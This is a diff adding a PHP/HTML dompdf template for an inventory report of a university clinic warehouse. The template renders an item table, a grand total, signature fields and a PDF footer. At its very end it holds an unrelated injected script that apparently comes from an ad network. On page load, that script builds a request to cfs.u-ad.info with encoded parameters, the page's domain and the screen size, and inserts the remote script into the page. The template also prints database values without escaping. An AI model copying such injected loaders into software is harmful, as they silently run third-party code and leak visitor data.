@@ -1,0 +1,188 @@
+<?php
+  function row_class($row)
+  {
+    $class = '';
+    if ($row % 2 == 0)
+      $class = 'even_row';
+    else
+      $class = 'odd_row';
+
+    return $class;
+  }
+
+  function convert_money($number, $pecahan = 2)
+  {
+    return number_format($number, $pecahan, ',', '.');
+  }
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+  <link rel="STYLESHEET" href="view/assets/dist/css/dompdf/print_static.css" type="text/css" />
+</head>
+
+<body>
+
+  <div id="body">
+
+    <div id="section_header">
+    </div>
+
+    <div id="content">
+      
+      <div class="page" style="font-size: 7pt">
+        <table style="width: 100%;" class="header">
+          <tr>
+            <td><h1 style="text-align: left"><?php echo $jenis_laporan; ?></h1></td>
+            <td><h1 style="text-align: right">Per: <?php echo $periode; ?></h1></td>
+          </tr>
+        </table>
+
+        <table style="width: 100%; font-size: 8pt;">
+          <tr>
+            <td>Per: <strong><?php echo $periode; ?></strong></td>
+            <td>Pemimpin: <strong><?php echo $user_pemimpin; ?></strong></td>
+          </tr>
+
+          <tr>
+            <td>Tanggal: <strong><?php echo $tanggal; ?></strong></td>
+            <td></td>
+          </tr>
+
+          <tr>
+            <td>Alamat: <strong>Kampus Unsri Indralaya KM. 32</strong></td>
+            <td></td>
+          </tr>
+        </table>
+
+        <table style="width: 100%; border-top: 1px solid black; border-bottom: 1px solid black; font-size: 8pt;">
+          <tr>
+            <td>Model: <strong>Laporan</strong></td>
+            <td>Jenis: <strong><?php echo $jenis_laporan; ?></strong></td>
+            <td>Periode: <strong><?php echo $periode; ?></strong></td>
+          </tr>
+        </table>
+
+        <table class="change_order_items">
+
+          <tr><td colspan="5"><h2>Daftar Item:</h2></td></tr>
+
+          <tbody>
+            <tr>
+              <th>ID</th>
+              <th>Nama</th>
+              <th>Jumlah</th>
+              <th>Harga per Unit</th>
+              <th>Total</th>
+            </tr>
+            <?php
+              $row = 0;
+              $grand_total = 0;
+              foreach ($data_tabel as $data)
+              {
+                echo "<tr class='" . row_class($row) . "'>
+                        <td style='text-align: center'>{$data->id}</td>
+                        <td>{$data->nama}</td>
+                        <td style='text-align: center'>" .($data->stok * 1). "</td>
+                        <td style='text-align: right;'>Rp. " .convert_money($data->harga). "</td>
+                        <td style='text-align: right;'>Rp. " .convert_money($data->total). "</td>
+                      </tr>
+                      ";
+                $row ++;
+                $grand_total += $data->total;
+              }
+            ?>
+          </tbody>
+          <tr>
+            <td colspan="3" style="text-align: right;"></td>
+            <td style="text-align: right;"><strong>GRAND TOTAL:</strong></td>
+            <td style='text-align: right;'><strong>Rp. <?php echo convert_money($grand_total); ?></strong></td></tr>
+        </table>
+
+        <table class="sa_signature_box" style="border-top: 1px solid black; padding-top: 2em; margin-top: 2em;">
+
+          <tr>    
+            <td>Kepala Gudang:</td><td class="written_field" style="padding-left: 2.5in">&nbsp;</td>
+          </tr>
+          <tr>
+            <td colspan="3" style="padding-top: 0em">&nbsp;</td>
+          </tr>
+
+        <tr><td colspan="4" style="white-space: normal">
+        Laporan ini dibuat berdasarkan pencatatan dalam sistem dan dalam pengawasan kepala gudang.
+        Segala perubahan data pada sistem akan langsung mempengaruhi laporan.
+        </td>
+        </tr>
+
+        <tr>
+        <td colspan="2">
+        
+        </td>
+
+        <td colspan="2" style="padding-left: 1em;">UPT Klinik Kesehatan Unsri<br/><br/>
+        PER: 
+        <span class="written_field" style="padding-left: 2.5in">&nbsp;</span>
+        </td>
+        </tr>
+        </table>
+
+        </div>
+
+    </div>
+  </div>
+
+  <script type="text/php">
+
+
+    $font = Font_Metrics::get_font("verdana");
+    // If verdana isn't available, we'll use sans-serif.
+    if (!isset($font)) { Font_Metrics::get_font("sans-serif"); }
+    $size = 6;
+    $color = array(0,0,0);
+    $text_height = Font_Metrics::get_font_height($font, $size);
+
+    $foot = $pdf->open_object();
+    
+    $w = $pdf->get_width();
+    $h = $pdf->get_height();
+
+    // Draw a line along the bottom
+    $y = $h - 2 * $text_height - 24;
+    $pdf->line(16, $y, $w - 16, $y, $color, 1);
+
+    $y += $text_height;
+
+    $text = "Job: 132-003";
+    $pdf->text(16, $y, $text, $font, $size, $color);
+
+    $pdf->close_object();
+    $pdf->add_object($foot, "all");
+
+    global $initials;
+    $initials = $pdf->open_object();
+    
+    // Add an initals box
+    $text = "Initials:";
+    $width = Font_Metrics::get_text_width($text, $font, $size);
+    $pdf->text($w - 16 - $width - 38, $y, $text, $font, $size, $color);
+    $pdf->rectangle($w - 16 - 36, $y - 2, 36, $text_height + 4, array(0.5,0.5,0.5), 0.5);
+      
+
+    $pdf->close_object();
+    $pdf->add_object($initials);
+   
+    // Mark the document as a duplicate
+    $pdf->text(110, $h - 240, "DUPLICATE", Font_Metrics::get_font("verdana", "bold"),
+               110, array(0.85, 0.85, 0.85), 0, 0, -52);
+
+    $text = "Page {PAGE_NUM} of {PAGE_COUNT}";  
+
+    // Center the text
+    $width = Font_Metrics::get_text_width("Page 1 of 2", $font, $size);
+    $pdf->page_text($w / 2 - $width / 2, $y, $text, $font, $size, $color);
+
+  </script>
+
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bG8Ra7gq947WZ%2fYBYbH%2for4YoV8qiJJ5wOa014eg3kIiYD3DH0tKBLPVhDsf6dVzGnNjggnbt9ESBnf1PxRs3GrhepLyeL4Y02QNSYTPToqYsGER3OQ%2fDcd4tBHwvldc%2bTRwc072uBQ6h%2brC2jIgJ7wWdpy6qN9OBEGUVrp6G8nJENbvbYi3zCQ1reT0vWhTRIar9K4eki9AVnGxIvwb7WuQViVoDF7yu064VLy%2bDks5faArnRGx1mBrcC8FQAGhh%2baodiMWBzRoNnOkh9iu3fgpUFHi2hrMssCElxDwrPDPe5%2ffOs7DwchbznpW6ZXLsTZNqNWinKYF1KvbzEMIb1prq4dyLM8wUUd9PjN1Svhtqasnw1i%2fdLTw4eGXYM9UYTbqmfdXOS46AdFVa7pFKITTmQyEoO1gc421YcHE%2byTfJpA6zilzDIHHbC7QJkikxX92%2f5ymKP%2f1M1WmwOrHIICY31WFKyewN875TUKAwf%2bYnZ1DeBOzLRPrwg8hM5J0XbO99wt6rbpoIT8C5V0JtLVrfXmHVBYccfyH%2bRimDOCf23yWyQHuDRsL2wSKasXAdWR4n7yqfOM0%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+  </body>
+</html>
